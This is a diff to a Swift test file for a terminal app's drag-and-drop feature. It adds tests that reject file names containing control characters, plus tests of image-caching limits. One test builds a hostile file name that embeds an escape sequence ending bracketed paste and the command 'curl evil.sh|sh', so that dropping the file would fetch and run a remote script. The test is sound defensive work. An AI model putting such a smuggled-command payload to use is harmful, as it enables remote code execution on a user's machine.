@@ -50,6 +50,37 @@ struct TerminalDropTests {
         #expect(TerminalDrop.filesToPaste(from: many).count == TerminalDrop.maxFiles)
     }
 
+    @Test func filesWithControlCharactersInTheirNameAreRefused() throws {
+        let root = FileManager.default.temporaryDirectory.appendingPathComponent(
+            "sigil-drop-\(UUID().uuidString)", isDirectory: true)
+        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: root) }
+
+        let safe = root.appendingPathComponent("shot.png")
+        let hostile = root.appendingPathComponent("shot.png\u{1b}[201~\u{15}curl evil.sh|sh\r")
+        let newline = root.appendingPathComponent("a\nb.txt")
+        let c1 = root.appendingPathComponent("a\u{9b}b.txt")
+        for url in [safe, hostile, newline, c1] {
+            try Data("x".utf8).write(to: url)
+        }
+
+        #expect(TerminalDrop.isSafeToPaste(safe.path))
+        #expect(TerminalDrop.isSafeToPaste("/tmp/my photo \u{1F4F7}.png"))
+        #expect(!TerminalDrop.isSafeToPaste(hostile.path))
+        #expect(TerminalDrop.filesToPaste(from: [hostile, safe, newline, c1]) == [safe])
+        #expect(TerminalDrop.hasUnsafeFileName([safe, hostile]))
+        #expect(!TerminalDrop.hasUnsafeFileName([safe]))
+
+        let pasteboard = NSPasteboard(name: .init("sigil-drop-\(UUID().uuidString)"))
+        defer { pasteboard.releaseGlobally() }
+        pasteboard.clearContents()
+        pasteboard.writeObjects([safe as NSURL, hostile as NSURL])
+        #expect(!TerminalDrop.canAccept(pasteboard))
+        #expect(throws: TerminalDrop.Error.unsafeFileName) {
+            try TerminalDrop.pathsToPaste(from: pasteboard)
+        }
+    }
+
     @Test func pngMagicBytesAreRecognizedAndWritten() throws {
         let png = try #require(
             Data(
@@ -111,5 +142,36 @@ struct TerminalDropTests {
         }
         let left = try FileManager.default.contentsOfDirectory(at: root, includingPropertiesForKeys: nil)
         #expect(left.count == TerminalDrop.cacheKeepCount)
+    }
+
+    @Test func aFullPhoneMessageOfImagesSurvivesUntilSubmit() throws {
+        let png = try #require(
+            Data(
+                base64Encoded:
+                    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
+            ))
+        let root = FileManager.default.temporaryDirectory.appendingPathComponent(
+            "sigil-remote-images-\(UUID().uuidString)", isDirectory: true)
+        defer { try? FileManager.default.removeItem(at: root) }
+        let photos = try (0..<TerminalDrop.maxFiles).map { index in
+            try TerminalDrop.writeRemoteFile(png, name: "photo-\(index).jpg", to: root)
+        }
+        #expect(photos.allSatisfy { FileManager.default.fileExists(atPath: $0.path) })
+    }
+
+    @Test func aLocalImagePasteKeepsAFullPhoneMessageOfFiles() throws {
+        let png = try #require(
+            Data(
+                base64Encoded:
+                    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
+            ))
+        let root = FileManager.default.temporaryDirectory.appendingPathComponent(
+            "sigil-remote-mixed-\(UUID().uuidString)", isDirectory: true)
+        defer { try? FileManager.default.removeItem(at: root) }
+        let notes = try (0..<TerminalDrop.maxFiles).map { index in
+            try TerminalDrop.writeRemoteFile(Data("note \(index)".utf8), name: "note-\(index).md", to: root)
+        }
+        _ = try TerminalDrop.writeImage(png, to: root)
+        #expect(notes.allSatisfy { FileManager.default.fileExists(atPath: $0.path) })
     }
 }
